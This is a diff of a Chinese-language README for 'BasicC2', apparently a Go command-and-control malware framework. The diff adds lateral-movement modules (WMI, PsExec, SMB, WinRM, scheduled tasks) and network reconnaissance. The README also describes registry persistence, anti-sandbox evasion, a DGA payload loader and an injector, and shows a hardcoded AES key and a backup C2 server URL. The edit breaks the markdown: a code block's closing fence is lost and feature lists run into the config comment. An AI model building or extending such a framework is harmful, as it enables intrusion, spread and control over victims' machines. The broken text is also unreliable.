@@ -16,18 +16,28 @@ BasicC2/
 │   │   └── aes.go
 │   ├── config/                   # 配置管理
 │   │   └── config.go
-│   └── models/                   # 数据结构
-│       └── types.go
+│   ├── models/                   # 数据结构
+│   │   └── types.go
+│   └── dga/                      # DGA 域名生成
+│       └── dga.go
 ├── agent/                        # Agent 特有模块
 │   ├── commands/                 # 命令执行
 │   │   ├── executor.go
-│   │   └── screenshot.go
+│   │   ├── screenshot.go
+│   │   └── lateral.go           # 横向移动命令处理
+│   ├── lateral/                  # 横向移动模块 ⭐新增
+│   │   ├── lateral.go           # 核心管理器
+│   │   ├── wmi.go               # WMI 横向移动
+│   │   ├── psexec.go            # PsExec 横向移动
+│   │   ├── smb.go               # SMB 横向移动
+│   │   ├── schtasks.go          # 计划任务横向移动
+│   │   ├── recon.go             # 侦察功能
+│   │   ├── lateral_test.go      # 单元测试
+│   │   └── README.md            # 模块文档
 │   ├── persistence/              # 持久化
 │   │   └── install.go
-│   ├── evasion/                  # 反沙箱/反检测
-│   │   └── sandbox.go
-│   └── dga/                      # DGA 域名生成
-│       └── dga.go
+│   └── evasion/                  # 反沙箱/反检测
+│       └── sandbox.go
 ├── server/                       # Server 特有模块
 │   ├── handlers/                 # HTTP 处理器
 │   │   └── handlers.go
@@ -40,6 +50,8 @@ BasicC2/
 │       └── injector.go
 ├── web/                          # Web 前端
 │   └── index.html
+├── .vscode/                      # VS Code 配置
+│   └── settings.json            # 编辑器设置
 ├── go.mod                        # Go 模块定义
 ├── go.sum                        # 依赖版本锁定
 ├── Makefile                      # 构建脚本
@@ -62,6 +74,8 @@ BasicC2/
 - ✅ 命令执行
 - ✅ 屏幕截图
 - ✅ 中文编码处理
+- ✅ 横向移动 (Lateral Movement)
+- ✅ 网络侦察与信息收集
 
 ### 3. 加载器 (Loader)
 - ✅ DGA Payload 下载
@@ -124,10 +138,28 @@ var AESKey = []byte("HereIsMySecretKey123456789012345")
 // C2 服务器地址
 const BackupC2URL = "https://api.cailiu666.xyz"
 
-// DGA 种子
-const DGASeed = "MySecretSeed2024"
-```
+// DGA 种子、截图和横向移动
+- **lateral**: 横向移动模块，支持 WMI、PsExec、SMB、WinRM、计划任务等多种方法
+- **persistence**: 持久化安装（注册表 + 文件复制）
+- **evasion**: 反沙箱检测（CPU 核心数等）
 
+### 横向移动模块特性
+
+支持多种横向移动技术：
+- **WMI**: 使用 Windows Management Instrumentation
+- **PsExec**: 使用 Sysinternals PsExec 工具
+- **SMB**: 通过 SMB 共享复制和执行文件
+- **WinRM**: 使用 PowerShell Remoting
+- **Schtasks**: 通过计划任务执行
+
+侦察功能：
+- 网络扫描 (主机发现)
+- SMB/WMI/WinRM 访问权限检查
+- 系统信息收集
+- 进程列表获取
+- 用户列表获取
+
+详细文档请参考：[agent/lateral/README.md](agent/lateral/README.md)
 ## 模块说明
 
 ### internal/ - 公共模块
